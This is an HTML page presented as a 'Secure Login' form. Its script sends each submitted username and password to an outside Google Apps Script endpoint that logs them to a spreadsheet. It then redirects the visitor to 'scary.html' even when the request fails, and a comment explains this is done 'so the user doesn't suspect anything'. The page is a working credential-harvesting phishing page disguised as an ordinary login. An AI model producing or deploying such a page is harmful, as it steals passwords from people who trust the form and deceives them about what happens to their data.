<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1a1a1a; margin: 0; }
        .login-box { background: #2d2d2d; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 320px; color: white; }
        h2 { text-align: center; margin-bottom: 25px; }
        .input-group { margin-bottom: 20px; position: relative; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #444; background: #3d3d3d; color: white; box-sizing: border-box; }
        .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #aaa; }
        button { width: 100%; padding: 12px; background: #e74c3c; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #c0392b; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Secure Login</h2>
    <form id="loginForm">
        <div class="input-group">
            <input type="text" name="username" placeholder="Username" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" name="password" placeholder="Password" required>
            <i class="fas fa-eye toggle-password" id="eyeIcon"></i>
        </div>
        <button type="submit">LOGIN</button>
    </form>
</div>

<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbztTlG3USYjrB4MJ1PPglFuKwzBrvQ-2ntyUEftl4MA4jExCYKX3zOK_fILViFzBFQPUw/exec';
    const form = document.querySelector('#loginForm');
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');

    // Eye icon toggle logic
    eyeIcon.addEventListener('click', () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        eyeIcon.classList.toggle('fa-eye');
        eyeIcon.classList.toggle('fa-eye-slash');
    });

    // Form submission logic
    form.addEventListener('submit', e => {
        e.preventDefault(); 
        
        // Sends the form data (username & password) to your Google Sheet
        fetch(scriptURL, { 
            method: 'POST', 
            body: new FormData(form)
        })
        .then(response => {
            console.log('Success!', response);
            // Redirects to scary.html after the data is saved
            window.location.href = "scary.html";
        })
        .catch(error => {
            console.error('Error!', error.message);
            // Redirects even on error so the user doesn't suspect anything
            window.location.href = "scary.html";
        });
    });
</script>

</body>
</html>
